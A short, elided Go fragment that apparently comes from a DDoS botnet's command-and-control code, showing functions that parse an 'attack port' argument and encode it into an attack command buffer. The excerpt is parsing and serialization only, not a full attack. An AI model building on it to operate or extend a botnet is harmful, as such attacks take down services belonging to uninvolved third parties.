...
func NewAttack(str string, admin int) (*Attack, error) {
    atk := &Attack{0, 0, 0, make(map[uint32]uint8), make(map[uint8]string)}
    ...
    // Parse attack port
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack port")
    } else {
        if args[0] == "?" {
            return nil, errors.New("Attack port.")
        }
        port, err := strconv.Atoi(args[0])
        if err != nil || port == 0 || port > 65535 {
            return nil, errors.New(fmt.Sprintf("Invalid attack port.", args[0]))
        }
        atk.Port = uint32(port)
        args = args[1:]
    }
...
func (this *Attack) Build() ([]byte, error) {
    ...
    // Add in attack port
    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Port)
    buf = append(buf, tmp...)
